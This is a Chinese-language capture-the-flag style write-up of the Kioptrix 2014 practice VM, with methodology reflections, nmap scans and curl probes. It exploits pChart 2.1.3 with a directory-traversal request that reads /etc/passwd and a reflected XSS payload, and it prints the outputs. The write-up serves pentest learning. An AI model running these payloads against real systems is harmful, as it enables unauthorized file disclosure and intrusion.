
# 0. 准备
<details><summary>做这个靶机的收获、感想</summary>
<pre><code>
[官方渗透测试的执行标准的描述](http://www.pentest-standard.org/index.php/Main_Page)
> http://www.pentest-standard.org/index.php/Main_Page
1. Pre-engagement Interactions  前期交互
2. Intelligence Gathering   情报收集
3. Threat Modeling  威胁建模
4. Vulnerability Analysis   漏洞分析
5. Exploitation     漏洞利用
6. Post Exploitation    后渗透阶段
7. Reporting    报告阶段
最近在做一些靶机的时候有些迷茫，感觉很多时候是拍脑袋做事，想到哪一块就去做哪一块，在碰到困难、困境的时候，甚至感觉到思路很混乱，没有渗透测试的大局观，也缺少俯视整个过程的意识；以前只是想着能够挖掘出漏洞就是一个有效的渗透测试过程，挖不出漏洞怎么样都是空谈，可以说完全只关注到了结果，完全忽视了其他环节的重要性，尤其在做这个靶机的时候，体会尤其深刻；同时，在思想上就想一上手就去发现一些严重的RCE漏洞拿到进入系统的权限的想法在很大程度上影响了自己的做事方式：急功近利；综上因素，因此，又重新回顾一下渗透测试的七个流程，对比自己的渗透测试思绪，发现还是存在一些问题的，比如：
+ 信息收集阶段：存在很多忽略的信息，系统版本、系统架构、软件版本；
+ 威胁建模阶段：存在很多知识盲点，导致没有思路，比如常见的配置文件路径、比如应用反馈出来的现象如何对应到对应的配置文件中；
+ 漏洞分析阶段+漏洞利用：读代码的能力还是不足，也许是接触的代码类型较多(虽然大多是都是懂点皮毛)HTML、CSS、JS、PHP、JSP、PYTHON、GO、C、C++、JAVA，很多时候浮躁到不去分析exp代码，只是一味的拿来主义，一上来就去用，利用不成功也不知道如何去调试、修改EXP，但是别人就能利用成功，这就是差距；可能这两个阶段中用一句话总结比较合适：要着重培养自己的漏洞分析和利用能力，而不是工具的熟练程度。
+ 后渗透阶段：大多数时候，拿到系统的最高权限基本上就已经宣告工作的结束了，这也就造成拿到系统权限就是万事大吉了，对于后续的有价值信息的收集、权限的维持、多个后门等还是比较薄弱的，甚至于与蓝队的拉锯能力还是比较匮乏的。
</code></pre>
</details>


# 1. 过程

## 1.1. 信息收集

<details><summary>1. 主机探测</summary>

```shell
┌──(root㉿kali)-[~]
└─# nmap -sn 192.168.0.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 04:32 EDT
Nmap scan report for 192.168.0.1
Host is up (0.00065s latency).
MAC Address: 60:3A:7C:31:E8:66 (Tp-link Technologies)
Nmap scan report for 192.168.0.3
Host is up (0.027s latency).
MAC Address: A4:5E:60:C2:D9:0B (Apple)
Nmap scan report for 192.168.0.103
Host is up (0.000053s latency).
MAC Address: 00:0C:29:D9:5C:2C (VMware)
Nmap scan report for 192.168.0.106
Host is up (0.000073s latency).
MAC Address: B4:2E:99:86:D5:F2 (Giga-byte Technology)
Nmap scan report for 192.168.0.100
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds
```
</details>

<details><summary>2. 端口和服务探测</summary>

```shell
┌──(root㉿kali)-[/kioptrix4]
└─# cat nmap.text
# Nmap 7.92 scan initiated Fri Jun  3 22:14:29 2022 as: nmap -sT -p- -v -T 5 -sC -A -Pn -oN nmap.text 192.168.0.102
Nmap scan report for 192.168.0.102
Host is up (0.00042s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
MAC Address: 00:0C:29:D9:5C:2C (VMware)
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): FreeBSD 9.X|10.X|7.X|8.X|6.X (93%), AVtech embedded (91%)
OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10 cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:6.2 cpe:/a:nas4free:nas4free cpe:/o:freebsd:freebsd:10.2
Aggressive OS guesses: FreeBSD 9.0-RELEASE - 10.3-RELEASE (93%), FreeBSD 9.3-RELEASE (91%), AVtech Room Alert 26W environmental monitor (91%), FreeBSD 9.0-RELEASE (90%), FreeBSD 7.0-RELEASE - 9.0-RELEASE (88%), FreeBSD 7.0-RELEASE (87%), FreeBSD 7.1-PRERELEASE 7.2-STABLE (87%), FreeBSD 7.2-RELEASE - 8.0-RELEASE (87%), FreeBSD 9.1-RELEASE or 10.1-RELEASE (87%), FreeBSD 8.1-RELEASE (86%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.000 days (since Fri Jun  3 22:15:32 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 192.168.0.102

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  3 22:15:54 2022 -- 1 IP address (1 host up) scanned in 85.56 seconds
```
</details>

<details><summary>3. 测试一下服务</summary>

```shell
# 80端口
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v http://192.168.0.103
*   Trying 192.168.0.103:80...
* Connected to 192.168.0.103 (192.168.0.103) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.0.103
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 11 Jun 2022 08:55:11 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< Last-Modified: Sat, 29 Mar 2014 17:22:52 GMT
< ETag: "105c6-98-4f5c211723300"
< Accept-Ranges: bytes
< Content-Length: 152
< Content-Type: text/html
<
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>
 <body>
  <h1>It works!</h1>
 </body>
</html>
* Connection #0 to host 192.168.0.103 left intact
# 发现pChart2.1.3，并且重定向到了examples/index.php页面
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v http://192.168.0.103/pChart2.1.3/index.php
*   Trying 192.168.0.103:80...
* Connected to 192.168.0.103 (192.168.0.103) port 80 (#0)
> GET /pChart2.1.3/index.php HTTP/1.1
> Host: 192.168.0.103
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Sat, 11 Jun 2022 08:59:06 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< X-Powered-By: PHP/5.3.8
< Location: examples/index.php
< Content-Length: 0
< Content-Type: text/html
<
* Connection #0 to host 192.168.0.103 left intact
# 8080端口
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v http://192.168.0.103:8080/
*   Trying 192.168.0.103:8080...
* Connected to 192.168.0.103 (192.168.0.103) port 8080 (#0)
> GET / HTTP/1.1
> Host: 192.168.0.103:8080
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Sat, 11 Jun 2022 08:56:55 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< Content-Length: 202
< Content-Type: text/html; charset=iso-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /
on this server.</p>
</body></html>
* Connection #0 to host 192.168.0.103 left intact 
# 而且我发现该主机是不能ping的
┌──(root㉿kali)-[/kioptrix4]
└─# ping -v 192.168.0.103 -c 1
PING 192.168.0.103 (192.168.0.103) 56(84) bytes of data.

--- 192.168.0.103 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```
</details>


## 1.2. 威胁建模
## 1.3. 漏洞分析

<details><summary>1. pChart2.1.3</summary>

```shell
┌──(root㉿kali)-[/kioptrix4]
└─# searchsploit pChart
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
pChart 2.1.3 - Multiple Vulnerabilities                                              | php/webapps/31173.txt
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
# 提到了2个漏洞目录穿越、XSS
┌──(root㉿kali)-[/kioptrix4]
└─# cat 31173.txt
# Exploit Title: pChart 2.1.3 Directory Traversal and Reflected XSS
# Date: 2014-01-24
# Exploit Author: Balazs Makany
# Vendor Homepage: www.pchart.net
# Software Link: www.pchart.net/download
# Google Dork: intitle:"pChart 2.x - examples" intext:"2.1.3"
# Version: 2.1.3
# Tested on: N/A (Web Application. Tested on FreeBSD and Apache)
# CVE : N/A

[0] Summary:
PHP library pChart 2.1.3 (and possibly previous versions) by default
contains an examples folder, where the application is vulnerable to
Directory Traversal and Cross-Site Scripting (XSS).
It is plausible that custom built production code contains similar
problems if the usage of the library was copied from the examples.
The exploit author engaged the vendor before publicly disclosing the
vulnerability and consequently the vendor released an official fix
before the vulnerability was published.
#
#
[1] Directory Traversal:
"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"
The traversal is executed with the web server's privilege and leads to
sensitive file disclosure (passwd, siteconf.inc.php or similar),
access to source codes, hardcoded passwords or other high impact
consequences, depending on the web server's configuration.
This problem may exists in the production code if the example code was
copied into the production environment.
#
Directory Traversal remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.
#
#
[2] Cross-Site Scripting (XSS):
"hxxp://localhost/examples/sandbox/script/session.php?<script>alert('XSS')</script>
This file uses multiple variables throughout the session, and most of
them are vulnerable to XSS attacks. Certain parameters are persistent
throughout the session and therefore persists until the user session
is active. The parameters are unfiltered.
#
Cross-Site Scripting remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.
#

[3] Disclosure timeline:
2014 January 16 - Vulnerability confirmed, vendor contacted
2014 January 17 - Vendor replied, responsible disclosure was orchestrated
2014 January 24 - Vendor was inquired about progress, vendor replied
and noted that the official patch is released.
```
</details>

## 1.4. 漏洞利用
<details><summary>1. pChart2.1.3目录穿越</summary>

```shell
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v "http://192.168.0.103/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd" | html2text
*   Trying 192.168.0.103:80...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 192.168.0.103 (192.168.0.103) port 80 (#0)
> GET /pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd HTTP/1.1
> Host: 192.168.0.103
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 11 Jun 2022 09:15:55 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< X-Powered-By: PHP/5.3.8
< Content-Length: 2084
< Content-Type: text/html
<
{ [2084 bytes data]
100  2084  100  2084    0     0   522k      0 --:--:-- --:--:-- --:--:--  678k
* Connection #0 to host 192.168.0.103 left intact
# $FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:29:38Z pjd $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/
nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/
uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin
ossec:*:1001:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecm:*:1002:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecr:*:1003:1001:User &:/usr/local/ossec-hids:/sbin/nologin

### *关注最后三行，OSSEC---hids---Host Intrusion Detection System*
### *关注第一行，FreeBSD: release/9
### 这两个重要的信息被我无情的忽视了，在做个靶机的时候我还纳闷为啥老是时断时续的。
```
</details>

<details><summary>2. pChart2.1.3 XSS</summary>

```shell
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v "http://192.168.0.103/pChart2.1.3/examples/sandbox/script/session.php?<script>alert('XSS')</script>"
*   Trying 192.168.0.103:80...
* Connected to 192.168.0.103 (192.168.0.103) port 80 (#0)
> GET /pChart2.1.3/examples/sandbox/script/session.php?<script>alert('XSS')</script> HTTP/1.1
> Host: 192.168.0.103
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 11 Jun 2022 09:22:44 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< X-Powered-By: PHP/5.3.8
< Set-Cookie: PHPSESSID=m4uo3f6u11dgk9g4ja638i5gv3; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Content-Length: 50
< Content-Type: text/html
<
Array
(
    [<script>alert('XSS')</script>] =>
)
* Connection #0 to host 192.168.0.103 left intact
```
<pre><img src="https://github.com/eagleatman/mywriteup/blob/main/kioptrix-2014/images/1.png" width="56%" /></pre>
</details>

## 1.5. 后渗透
## 1.6. 报告


# 3. 遗留
- [ ] 后渗透阶段后续想专门做个主题，这篇文章就不准备写进去了，先暂时空一下；
- [ ] 由于对于一个靶机的渗透测试，可能比较简单；同时感觉个人能力有限，也更不想每个阶段都滥竽充数地写一点内容;所以我也只挑一些阶段区填充内容，这样某些阶段可能就是空白了，这个只能给日后的自己留个任务了(反正目前的水平只能先填充这么多了)。

# 4. 说明

